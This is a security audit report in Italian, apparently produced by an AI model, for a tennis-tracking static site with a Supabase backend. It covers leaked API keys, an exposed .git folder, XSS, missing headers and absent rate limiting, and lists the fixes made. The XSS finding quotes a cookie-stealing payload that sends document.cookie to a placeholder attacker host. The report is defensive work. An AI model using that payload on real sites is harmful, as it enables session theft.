# Security Audit Report — SinnerTracker — 9 Aprile 2026

**Project:** SinnerTracker
**Path:** /Users/luca/Documents/Claude/Projects/SinnerTracker
**Stack:** Static HTML/JS (Firebase Hosting) + Node.js scraper (Cloud Run Job)
**DB:** Supabase PostgREST (czcszeoylcelgtduijqc)
**Servizi a pagamento:** RapidAPI SportScore (free tier 500 req/mese)
**Deploy URL:** https://sinnertracker.com
**Auth:** None (sito read-only pubblico via anon key)
**Auditor:** Claude (api_security skill)

---

## Endpoints scoperti

| # | Path | Method | Auth | RLS | Rate Limit | Score |
|---|------|--------|------|-----|-----------|-------|
| 1 | `/rest/v1/sinner_profile` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 2 | `/rest/v1/rankings` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 3 | `/rest/v1/current_tournament` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 4 | `/rest/v1/draw_path` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 5 | `/rest/v1/matches` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 6 | `/rest/v1/recent_form` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 7 | `/rest/v1/tournaments` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 8 | `/rest/v1/news` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 9 | `/rest/v1/scenarios` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 10 | `/rest/v1/predictions` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 11 | `/rest/v1/odds` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 12 | `/rest/v1/meta` | GET/POST/PATCH/DELETE | Anon | ✅ | ❌ | 7/10 |
| 13 | `https://sinnertracker.com/*` | GET (static) | None | N/A | ❌ | 5/10 → 9/10 (post-fix) |
| 14 | `sinnertracker-scraper` (Cloud Run Job) | OAuth (Cloud Scheduler) | ✅ | N/A | N/A | 9/10 |

---

## Vulnerabilita trovate

### 🔴 CRITICAL (3)

#### C1 — Service role key Supabase nel git history del repo PUBBLICO
- **File:** `scraper/lib/supabase.js`, `supabase/seed.sh`
- **Commit:** `23074eb` (2026-04-06)
- **Repo:** github.com/lcphy/sinnertracker (PUBLIC)
- **Impatto:** Bypass totale RLS, distruzione database, iniezione di malware HTML che il frontend renderizza
- **Status:** Codice fixato (✅), key da revocare manualmente

#### C2 — RapidAPI key nel git history del repo PUBBLICO
- **File:** `scraper/scrapers/api-tennis.js`
- **Commit:** `4485dc2` (2026-04-07)
- **Impatto:** Esaurimento free tier 500 req/mese, possibile fatturazione overage
- **Status:** Codice fixato (✅), key da revocare manualmente

#### C3 — Cartella `.git/` esposta su sinnertracker.com
- **URL esposti:**
  - `https://sinnertracker.com/.git/HEAD` (200)
  - `https://sinnertracker.com/.git/index` (200)
  - `https://sinnertracker.com/.git/config` (200) → mostrava `url = https://github.com/lcphy/sinnertracker.git`
  - `https://sinnertracker.com/.git/refs/heads/main` (200)
  - `https://sinnertracker.com/.git/logs/HEAD` (200)
- **Impatto:** Un attaccante poteva clonare l'intero repo (incluso git history con i secret di C1 e C2) anche senza scoprire il GitHub repo
- **Causa:** `firebase.json` aveva pattern `**/.*` che NON esclude correttamente le cartelle ricorsive
- **Status:** `firebase.json` fixato (✅) — deploy in attesa di Firebase reauth

### 🟠 HIGH (2)

#### H1 — XSS via innerHTML in 7 funzioni di render
- **File:** `app.js` linee 35, 162, 185, 252, 272, 308, 340
- **Vettore:** scraper RSS legge titoli da OASport/SkySport → salva in Supabase senza sanitization → frontend usa innerHTML
- **Esempio attacco:** un titolo RSS con `<img src=x onerror="fetch('https://evil/?'+document.cookie)">` veniva eseguito nel browser
- **Status:** Fixato con `esc()` HTML escape function applicata a tutti i campi user-generated (✅)

#### H2 — Security headers mancanti su Firebase Hosting
- **Headers assenti:** Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy
- **Header presente:** Strict-Transport-Security (default Firebase)
- **Status:** `firebase.json` aggiornato con headers completi (✅) — deploy in attesa

### 🟡 MEDIUM (3)

#### M1 — Due service account keys attive su GCP
- `github-deploy@ai-agency-eu` ha 2 SA keys, una basta
- **Fix:** `gcloud iam service-accounts keys delete ce161455... --iam-account=github-deploy@...`

#### M2 — Nessun rate limiting sull'anon key Supabase
- Test k6 (`rate-limit.js`): 100 richieste in 10s, ZERO 429
- **Impatto:** un bot puo flood la Supabase free tier (50K monthly requests)
- **Mitigation suggerita:** Cloudflare davanti a sinnertracker.com, oppure spostare le query a un proxy server-side

#### M3 — RLS DENY policies non esplicite
- Le RLS sono solo `FOR SELECT` per anon (allow), e per assenza di policy POST/PATCH/DELETE sono bloccate. Funziona ma non e' difensivo.
- **Suggerimento:** aggiungere policy esplicite di DENY per chiarezza

### 🟢 LOW (2)

#### L1 — npm audit clean
0 vulnerabilita nelle dipendenze scraper.

#### L2 — Dipendenze npm con `^` versioning
Non pinnano la patch version. Ok per progetto piccolo, ma in produzione conviene `package-lock.json` strict.

---

## Cose che funzionano correttamente ✅

1. **RLS Supabase** — write da anon bloccate al 100% (48/48 check k6 PASS)
2. **Payload validation** — Supabase REST resiste a SQL injection, XSS, path traversal, null bytes (21/21 check PASS)
3. **GCP IAM** — service account `github-deploy` ha solo 4 ruoli minimi (least privilege)
4. **GDPR compliance** — font Inter self-hosted, niente Google Fonts CDN, niente tracker
5. **HSTS attivo** — Firebase Hosting lo aggiunge di default
6. **No Server header leak** — niente fingerprinting del web server
7. **No X-Powered-By leak** — niente fingerprinting del framework

---

## Fix applicati in questa sessione

- [x] **firebase.json**: aggiunto `.git/**`, `.github/**`, `tests/**`, `.firebaserc` alla ignore list
- [x] **firebase.json**: aggiunti CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy
- [x] **app.js**: aggiunta funzione `esc()` per HTML escape
- [x] **app.js**: aggiunta funzione `safeUrl()` per whitelist http(s) (no `javascript:`)
- [x] **app.js**: applicato `esc()` a tutti i campi user-generated nei 7 render*
- [x] **app.js**: validazione strict su `barWidth` (regex `\d{1,3}%`) e `barColor` (regex `#[0-9A-Fa-f]{3,8}`) per prevenire CSS injection
- [x] **scraper/lib/supabase.js**: rimosso fallback hardcoded service_role key, throw se mancante
- [x] **scraper/scrapers/api-tennis.js**: rimosso fallback hardcoded RapidAPI key, throw se mancante
- [x] **supabase/seed.sh**: rimosso service_role hardcoded, legge da `SUPABASE_SERVICE_ROLE_KEY` env var
- [x] **.env.example**: documentate env vars necessarie
- [x] **.gitignore**: aggiunto `.firebase/`
- [x] **tests/k6/**: 6 script di test + README

## Fix da applicare manualmente (richiedono azione utente)

- [ ] **Revoca service_role key** su [Supabase dashboard](https://supabase.com/dashboard/project/czcszeoylcelgtduijqc/settings/api) → "Reset service role key"
- [ ] **Revoca RapidAPI key** su [RapidAPI dashboard](https://rapidapi.com/developer/security) → Regenerate
- [ ] **Aggiorna GitHub Secret** `SUPABASE_SERVICE_ROLE_KEY` con la nuova chiave
- [ ] **Aggiorna GitHub Secret** `RAPIDAPI_KEY` con la nuova chiave
- [ ] **Firebase login --reauth** poi `firebase deploy --only hosting:sinnertracker --project ai-agency-eu`
- [ ] **(Opzionale ma raccomandato)** Riscrivere git history con `git filter-repo` per cancellare i secret dai vecchi commit, OPPURE rendere il repo `lcphy/sinnertracker` privato
- [ ] **(Cleanup)** `gcloud iam service-accounts keys delete ce161455...`

---

## k6 Test Results

| Test | Result | Note |
|------|--------|------|
| `rls-write-block.js` | ✅ PASS (48/48) | Anon key non puo scrivere su nessuna delle 12 tabelle |
| `payload-injection.js` | ✅ PASS (21/21) | Supabase REST resiste a SQL injection, XSS, path traversal |
| `security-headers.js` | ❌ FAIL (4/9) | CSP, X-Frame, X-Content-Type, Referrer, Permissions assenti — fix in `firebase.json`, aspetta deploy |
| `exposed-files.js` | ❌ FAIL (21/22) | `.git/config` esposto — fix in `firebase.json`, aspetta deploy |
| `rate-limit.js` | ❌ NO RATE LIMITING | 100/100 requests OK in 10s, nessun 429 — Mitigation manuale richiesta |
| `load.js` | Non eseguito | Stress test 50 VU — riservato a verifica post-deploy |

**Esecuzione:**
```bash
cd /Users/luca/Documents/Claude/Projects/SinnerTracker
for f in tests/k6/*.js; do echo "=== $f ==="; /opt/homebrew/bin/k6 run "$f"; done
```

---

## Limitazioni note

1. **`security-headers.js` e `exposed-files.js` falliranno** finche l'utente non rideploya Firebase con il `firebase.json` aggiornato (richiede `firebase login --reauth`)
2. **I secret rimangono nel git history** del repo pubblico anche dopo i fix locali — serve `git filter-repo` o rendere il repo privato
3. **Non posso revocare le API key automaticamente** — solo l'utente lo puo fare dalle dashboard
4. **`load.js` non eseguito** per evitare di consumare quota Firebase nei test (puo essere eseguito manualmente)

---

## Next steps prioritari

### Immediato (entro 1 ora) 🔴
1. Revoca service_role key Supabase + RapidAPI key
2. Aggiorna i 2 GitHub Secrets
3. `firebase login --reauth` + deploy per chiudere `.git/` esposta e attivare CSP

### Stessa giornata 🟠
4. Decisione su git history: filter-repo o repo privato?
5. Esegui `gh workflow run "Deploy Scraper"` per propagare il rimosso fallback agli env vars del Cloud Run Job

### Questa settimana 🟡
6. Mettere Cloudflare davanti a sinnertracker.com per rate limiting
7. Aggiungere RLS DENY policies esplicite
8. Eliminare la SA key ridondante

### Mese prossimo 🟢
9. Setup di CI/CD per eseguire k6 tests automaticamente prima di ogni deploy
10. Pinning stretto delle dipendenze npm

---

**Audit time:** ~30 minuti
**Vulnerabilita trovate:** 8 (3 critical, 2 high, 3 medium, 0 low)
**Fix applicati automaticamente:** 11
**Fix manuali richiesti:** 7
**Costo dei test eseguiti:** €0
